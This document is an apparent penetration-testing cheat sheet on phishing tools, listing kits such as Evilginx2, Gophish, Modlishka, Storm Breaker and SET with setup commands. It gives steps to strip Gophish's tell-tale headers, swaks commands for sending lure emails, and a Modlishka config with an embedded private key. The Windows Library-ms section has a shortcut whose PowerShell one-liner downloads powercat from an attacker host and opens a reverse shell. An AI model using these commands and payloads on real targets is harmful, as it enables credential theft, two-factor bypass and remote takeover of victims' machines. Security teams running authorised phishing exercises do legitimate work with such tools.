# Social Engineering Tools

- [Resources](#resources)

## Table of Contents

- [Evilginx2](#evilginx2)
- [evilgophish](#evilgophish)
- [Gophish](#gophish)
- [Microsoft Windows Library Files](#microsoft-windows-library-files)
- [Modlishka](#modlishka)
- [Storm Breaker](#storm-breaker)
- [The Social Engineering Toolkit (SET)](#the-social-engineering-toolkit-set)

## Resources

| Name | Description | URL |
| --- | --- | --- |
| BlackPhish | Super lightweight with many features and blazing fast speeds. | https://github.com/iinc0gnit0/BlackPhish |
| Evilginx2 Phishlets | Evilginx2 Phishlets version (0.2.3) Only For Testing/Learning Purposes | https://github.com/An0nUD4Y/Evilginx2-Phishlets |
| evilginx2 | Standalone man-in-the-middle attack framework used for phishing login credentials along with session cookies, allowing for the bypass of 2-factor authentication | https://github.com/kgretzky/evilginx2 |
| Evilginx 3 PHISHLET | EvilGinx Modify / Custom PHISHLETs / JS | https://github.com/EvilWhales/EvilGinx-PHISHLETs-Custom |
| evilgophish | evilginx2 + gophish | https://github.com/fin3ss3g0d/evilgophish |
| EvilnoVNC | Ready to go Phishing Platform | https://github.com/JoelGMSec/EvilnoVNC |
| Gophish | Open-Source Phishing Toolkit | https://github.com/gophish/gophish |
| Modlishka | Modlishka. Reverse Proxy. | https://github.com/drk1wi/Modlishka |
| Muraena | Muraena is an almost-transparent reverse proxy aimed at automating phishing and post-phishing activities. | https://github.com/muraenateam/muraena |
| Nexphisher | Advanced Phishing tool for Linux & Termux | https://github.com/htr-tech/nexphisher |
| Phishing Club | Self hosted phishing framework | https://github.com/phishingclub/phishingclub |
| QRucible | Python utility that generates "imageless" QR codes in various formats | https://github.com/Flangvik/QRucible |
| Seeker | Accurately Locate Smartphones using Social Engineering | https://github.com/thewhiteh4t/seeker |
| SocialFish | Phishing Tool & Information Collector  | https://github.com/UndeadSec/SocialFish |
| SniperPhish | SniperPhish - The Web-Email Spear Phishing Toolkit | https://github.com/GemGeorge/SniperPhish |
| Storm Breaker | Social engineering tool [Access Webcam & Microphone & Location Finder] With {Py,JS,PHP} | https://github.com/ultrasecurity/Storm-Breaker |
| The Social-Engineer Toolkit (SET) | The Social-Engineer Toolkit is an open-source penetration testing framework designed for social engineering. | https://github.com/trustedsec/social-engineer-toolkit |

## Evilginx2

> https://help.evilginx.com/docs/getting-started/building

> https://help.evilginx.com/docs/getting-started/quick-start

> https://help.evilginx.com/docs/guides/phishlets

### Installation

```console
$ sudo apt-get install golang
$ git clone https://github.com/kgretzky/evilginx2.git
$ cd evilginx2
$ make
$ sudo ./build/evilginx -p ./phishlets
```

#### Alternatively with Redirectors

```console
$ sudo ./build/evilginx -p ./phishlets -t ./redirectors -developer
```

### Basic Commands

```console
: phishlets
: lures
: sessions
```

### Prepare Certificates

```console
$ sudo cp /root/.evilginx/crt/ca.crt /usr/local/share/ca-certificates/evilginx.crt
$ sudo update-ca-certificates
```

### Domain Setup

```console
: config domain <DOMAIN>
: config ipv4 <LHOST>
```

### Phishlets

> https://help.evilginx.com/docs/guides/phishlets

> https://github.com/An0nUD4Y/Evilginx2-Phishlets

```console
: phishlets hostname <PHISHLET> <DOMAIN>
: phishlets enable <PHISHLET>
```

### Lures

> https://help.evilginx.com/docs/guides/lures

```console
: lures create <PHISHLET>
: lures get-url <ID>
```

### Session Handling

```console
: sessions
: sessions <ID>
```

## evilgophish

> github.com/fin3ss3g0d/evilgophish

### Installation

```console
$ git clone https://github.com/fin3ss3g0d/evilgophish
$ chmod +x setup.sh
$ ./setup.sh <DOMAIN> <SUB_DOMAIN> <SUB_DOMAIN> <SUB_DOMAIN>
```

### Prerequisites

#### Port Forwarding

```console
$ ssh -L 3333:localhost:3333 <USERNAME>@<RHOST>
```

#### Tmux

```console
$ tmux
```

##### Tmux Pane Gophish

```console
$ ./gophish
```

##### Tmux Pane evilginx3

```console
$ sudo ./evilginx3 -g /PATH/TO/evilgophish/gophish/gophish.db -p /PATH/TO/evilgophish/evilginx3/legacy_phishlets
```

#### Gophish

- Import Users & Groups
- Create New Email/SMS Template
- Create New Email Sending Profiles

#### evilginx3

```console
: config domain <DOMAIN>
: config ipv4 <LHOST>
: phishlets hostname <PHISHLET> <DOMAIN>
: phishlets enable <PHISHLET>
: lures create <PHISHLET>
: lures get-url <ID>
```

## Gophish

> https://github.com/gophish/gophish

> https://www.ired.team/offensive-security/initial-access/phishing-with-gophish-and-digitalocean

### GoPhish Modification

> https://github.com/puzzlepeaches/sneaky_gophish

> https://www.redteam.cafe/phishing/gophish-mods

#### Clone GoPhish

```console
$ git clone https://github.com/gophish/gophish
```

#### Get a Custom 404 Page

```console
$ wget "https://raw.githubusercontent.com/puzzlepeaches/sneaky_gophish/main/files/404.html" -O "404.html"
```

#### Get a Custom Phish.go

```console
$ wget "https://raw.githubusercontent.com/puzzlepeaches/sneaky_gophish/main/files/phish.go" -O "phish.go"
```

#### Copy Custom Phish.go

```console
$ rm gophish/controllers/phish.go
$ mv phish.go gophish/controllers/phish.go
```

#### Copy new 404.html

```console
$ mv 404.html gophish/templates/404.html
```

```console
$ cd gophish
```

```console
$ sed -i 's/X-Gophish-Contact/X-Contact/g' models/email_request_test.go
$ sed -i 's/X-Gophish-Contact/X-Contact/g' models/maillog.go
$ sed -i 's/X-Gophish-Contact/X-Contact/g' models/maillog_test.go
$ sed -i 's/X-Gophish-Contact/X-Contact/g' models/email_request.go
```

#### Stripping X-Gophish-Signature

```console
$ sed -i 's/X-Gophish-Signature/X-Signature/g' webhook/webhook.go
```

#### Changing servername

```console
$ sed -i 's/const ServerName = "gophish"/const ServerName = "IGNORE"/' config/config.go
```

#### Changing rid value

```console
$ read -p 'Custom RID Parameter: ' uservar
$ sed -i 's/const RecipientParameter = "rid"/const RecipientParameter = "'$uservar'"/g' models/campaign.go
```

#### Build

```console
$ go build
```

### Create Gophish Service

```console
$ sudo vi /etc/systemd/system/gophish.service
```

```console
[Unit]
Description=GoPhish Phishing Framework
After=network.target

[Service]
Type=simple
ExecStart=/PATH/TO/gophish/gophish
WorkingDirectory=/PATH/TO/gophish
Restart=always
RestartSec=5
User=<USERNAME>

[Install]
WantedBy=multi-user.target
```

```console
$ sudo systemctl daemon-reexec
$ sudo systemctl daemon-reload
$ sudo systemctl enable gophish
$ sudo systemctl start gophish
$ sudo systemctl status gophish
```

### Port Forwarding

```console
$ ssh -i ~/.ssh/<SSH_KEY> root@<RHOST> -p <RPORT> -L 3333:localhost:3333 -N -f
```

## Microsoft Windows Library Files

### Installation of wsgidav

```console
$ pip install wsgidav
```

### Start wsgidav

```console
$ wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /PATH/TO/DIRECTORY/webdav/
```

### config.Library-ms

```console
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://<LHOST></url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```

Put the `config.Library-ms` file in the `webdav` folder.

### Shortcut File

Right-click on Windows to create a new `shortcut file`.

```console
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<LHOST>/powercat.ps1'); powercat -c <LHOST> -p <LPORT> -e powershell"
```

Put the `shortcut file (*.lnk)` into the `webdav` folder.

### Send Phishing Email

```console
$ swaks --server <RHOST> -t <EMAIL> -t <EMAIL> --from <EMAIL> --header "Subject: Staging Script" --body <FILE>.txt --attach @<FILE> --suppress-data -ap
```

## Modlishka

> https://github.com/drk1wi/Modlishka

> https://github.com/drk1wi/Modlishka/wiki/How-to-install

### Installation

```console
$ go install github.com/drk1wi/Modlishka@latest
```

```console
$ git clone https://github.com/drk1wi/Modlishka
```

### Certificate Handling

```console
$ openssl genrsa -out <FILE>.key 2048`
$ openssl req -x509 -new -nodes -key <FILE>.key -sha256 -days 1024 -out <FILE>.pem
```

### RegEx One-liner

```console
\r?\n
```

### config.json

```json                                                                                    
{
  "proxyDomain": "loopback.modlishka.io",
  "listeningAddress": "127.0.0.1",
  "target": "target-victim-domain.com",
  "targetResources": "",
  "targetRules":         "PC9oZWFkPg==:",
  "terminateTriggers": "",
  "terminateRedirectUrl": "",
  "trackingCookie": "id",
  "trackingParam": "id",
  "jsRules":"",
  "forceHTTPS": false,
  "forceHTTP": false,
  "dynamicMode": false,
  "debug": true,
  "logPostOnly": false,
  "disableSecurity": false,
  "log": "requests.log",
  "plugins": "all",
  "cert": "-----BEGIN CERTIFICATE-----\nMIIDzzCCAregAwIBAgIUA4EpJO7bxfND6jTvbw0auTClhgcwDQYJKoZIhvcNAQEL\nBQAwdzELMAkGA1UEBhMCVE8xDTALBgNVBAgMBHRvdG8xDTALBgNVBAcMBHRvdG8x\nDTALBgNVBAoMBHRvdG8xDTALBgNVBAsMBHRvdG8xDTALBgNVBAMMBHRvdG8xHTAb\nBgkqhkiG9w0BCQEWDnRvdG9AdG90by50b3RvMB4XDTI1MDUwNjE4MzQzN1oXDTI4\nMDIyNDE4MzQzN1owdzELMAkGA1UEBhMCVE8xDTALBgNVBAgMBHRvdG8xDTALBgNV\nBAcMBHRvdG8xDTALBgNVBAoMBHRvdG8xDTALBgNVBAsMBHRvdG8xDTALBgNVBAMM\nBHRvdG8xHTAbBgkqhkiG9w0BCQEWDnRvdG9AdG90by50b3RvMIIBIjANBgkqhkiG\n9w0BAQEFAAOCAQ8AMIIBCgKCAQEAqH6EcJ5C6CJfE2NOzORB79TGcRUbSRQFp4Ca\nQtboUs4gJvvDW8FkuGIEjvxS77zSvPu5f2m2u+DWqwjOtdXD2qU/qNc30PdY72N0\ni964txLUqqumib8DpqZ9A4gHAI2BiroRsXbppqWpcDgzLpru9CBXefQXRsaMA2Ep\nQfM3Ebh90RjpZXN2x1qhMX4K//C+70EU15jsIVmbqIWtpSDcQC+v7aMOYYiIuGUi\nw7TGzVJus9vEvm6mgmmwBcoKZT3E+hSKscr5yKAXVElvLbXUmfGjF4rLG5NpgbIK\n9LSL7uQ8Rd0EiP/tC9w/288liLPclr0sdobDlUtyPVzKH+Z59QIDAQABo1MwUTAd\nBgNVHQ4EFgQUxQ2+R92nU85Ho2SuHxJPGRsEZTcwHwYDVR0jBBgwFoAUxQ2+R92n\nU85Ho2SuHxJPGRsEZTcwDwYDVR0TAQH/BAUwAwEB/zANBgkqhkiG9w0BAQsFAAOC\nAQEAn+8Utcr2NR65Oh4xbPMQh+Q+PosgvaXN6cJUOJfQmWBPgeYFZmTQvHitnCWe\nZ4JetpWBWR21q4tvyBCuFz2Usacc50m4sAscl0psW6WwWLlsbdPI4NJmf2ibo4vg\nIghtnRV+Lppl/FkHtTXcieqclQlV7/g8nNkJwCQ+1MkubjoK4W3OBItBizu4X4Br\n7evoqbzgRcVfy6/qIMOzTR/dQUOIlGkkeox0RanAaUjG+cJH1J9MgMxAzC/Q0Pdo\nVEFNGDGOZiuqa1SZ55QEG+W4Tzhp6kg3+rpXfQNezNutVuCCUrnSz/QfSXdltdFK\nqALKJqCctmtYQ3Xs/0+qMr8v3g==\n-----END CERTIFICATE-----\n",
  "certKey": "-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQCofoRwnkLoIl8T\nY07M5EHv1MZxFRtJFAWngJpC1uhSziAm+8NbwWS4YgSO/FLvvNK8+7l/aba74Nar\nCM611cPapT+o1zfQ91jvY3SL3ri3EtSqq6aJvwOmpn0DiAcAjYGKuhGxdummpalw\nODMumu70IFd59BdGxowDYSlB8zcRuH3RGOllc3bHWqExfgr/8L7vQRTXmOwhWZuo\nha2lINxAL6/tow5hiIi4ZSLDtMbNUm6z28S+bqaCabAFygplPcT6FIqxyvnIoBdU\nSW8ttdSZ8aMXissbk2mBsgr0tIvu5DxF3QSI/+0L3D/bzyWIs9yWvSx2hsOVS3I9\nXMof5nn1AgMBAAECggEACMcokq5oCWxq/BlXHF0C42H4IaGKHZ1FqyOLxdIo4dF7\nwtQoahIR83olxyY1kuhJKU/K6uyguLp+rIPlsvrrPGuR/LOTpJcSQsxxYK0Offkk\n66xMHY5+O/Md/a5bQQfeORI3BEIP657jTCWdYv7u1niN3hxdjxIebrmj2tv3ITzf\n12d2GOr4afsENnJnOC5Qf934Uz8SXjd9Ec9+kAmfUxHGwpUAoiaRUpMIluQy9ykM\nJfO/3/XbsXgLNEzI2sc0X665k5viG68F7YIPfmesCrqM8RlA4/Fm7Qd0V23Zftrv\n1+d67K1mNFSdawcrk/yOt5ELbIYxVX993vM7jwe6wQKBgQDiC5McD/t0HItGPFyU\nzVq+Jn+lzMgITrXLej9yzBKSjMopUMuhgMK5nGsjrFWWDzyRJh54/50Ox0Ysfm5U\nHyKT2wUBRhdeukZoqHMJXDsx5wnIHFH9knzGxtIDyjPfNVMRbV8irEN4YNIBGXSy\nwxhqfNaGbZ6ev9PPbUHJAVC7NQKBgQC+0pCxW0/opyQknl7NL8pYH0QSXqHoDmjb\niVnwulZyloDGaZK1dz4A9dKVDoCpMIDzd3DKug8Lwa6Dcl1eZIsptPAjZ4F3Irwo\n9gfr+oShbn+VRr/cdePwu6JF5TnEpZcJ1DZdRG2CxA8xpU+Mrzcur1qMpiF+0GtU\nk2bKI7fbwQKBgQDJ4JB3hYaLAlsYVRxSALzECdoCl0smsDUIDpvPyJXlsDt0fqX+\nDOLbpejBqU2egOkUsLiSU6dO5YW0gw3BrzTQW9CyfIiunyn2mkpy154+SRqhTzmi\nf0tUs4govlNpS1RuwgEvFC4FumKTfMqORFLv96IX2JrLKILgQ7F29OfG6QKBgHDn\nNSU62bTV79Sav4y30gkBts0HoNQkcnYydjywg6WY1uiOXndv7gezar02r3lrcWCc\nMug/3dce6ZpseEH5Sz2KCOtpung63Ql/SICe4QqCzooMKkjOl+c/nWutjNiFATCX\nlvLoIcNVLYg6Py8GHKhKqFC/muHlfxuzewXuzEIBAoGAKw1ziXEZerD5I0aWeE6e\n5g4DDvgrwg6j7dwGfu17ofyT+D0h5trYvpVrKx7UHTtnaydibee4x6PyDKf/lyz2\nmeuk0Vw0aKg4jkx5FornrpBkSk9n7ak3gK+LV27jrxeJliZkMZ1xZqKaORPBn1sH\nMErfchka6FsCS1kL7SxxuGU=\n-----END PRIVATE KEY-----",
  "certPool": ""
}
```

### Execution

```console
$ ~/go/bin/Modlishka -config <FILE>.json
[Tue May  6 18:50:02 2025]  INF  Enabling plugin: autocert v0.1
[Tue May  6 18:50:02 2025]  INF  Enabling plugin: control_panel v0.1
[Tue May  6 18:50:02 2025]  INF  Enabling plugin: hijack v0.1
[Tue May  6 18:50:02 2025]  INF  Enabling plugin: template v0.1
[Tue May  6 18:50:02 2025]  INF  Control Panel: SayHello2Modlishka handler registered	
[Tue May  6 18:50:02 2025]  INF  Control Panel URL: loopback.modlishka.io/SayHello2Modlishka
[Tue May  6 18:50:02 2025]  INF  

 _______           __ __ __         __     __          
|   |   |.-----.--|  |  |__|.-----.|  |--.|  |--.---.-.
|       ||  _  |  _  |  |  ||__ --||     ||    <|  _  |
|__|_|__||_____|_____|__|__||_____||__|__||__|__|___._|

>>>> "Modlishka" Reverse Proxy started - v.1.1 <<<<
Author: Piotr Duszynski @drk1wi  

Listening on [127.0.0.1:443]
Proxying HTTPS [target-victim-domain.com] via [https://loopback.modlishka.io]
Listening on [127.0.0.1:80]
Proxying HTTP [target-victim-domain.com] via [http://loopback.modlishka.io]
```

## Storm Breaker

> https://medium.com/@frost1/access-location-camera-microphone-of-any-device-547c5b9907f3

### Installation

```console
$ git clone https://github.com/ultrasecurity/Storm-Breaker.git
$ cd Storm-Breaker
$ sudo bash install.sh
$ sudo python3 -m pip install -r requirements.txt
$ sudo python3 st.py
```

### Start ngrok Agent

```console
$ ngrok http 2525
```

> http://8d0b-92-180-8-97.ngrok-free.app -> http://localhost:2525

| Username | Password |
| --- | --- |
| admin | admin |

Chose a link to send to the target.

> http://8d0b-92-180-8-97.ngrok-free.app/templates/nearyou/index.html

## The Social Engineering Toolkit (SET)

### Credential Harvesting

```console
$ sudo setoolkit
```

Navigate to `Social-Engineering Attacks` > `Website Attack Vectors` > `Credential Harvester Attack` > `Site Cloner` == `1`, `2`, `3`, `2`.

```console
$ swaks --to <EMAIL> --from <EMAIL> --server <RHOST> --port 25 --body <FILE>.txt
```
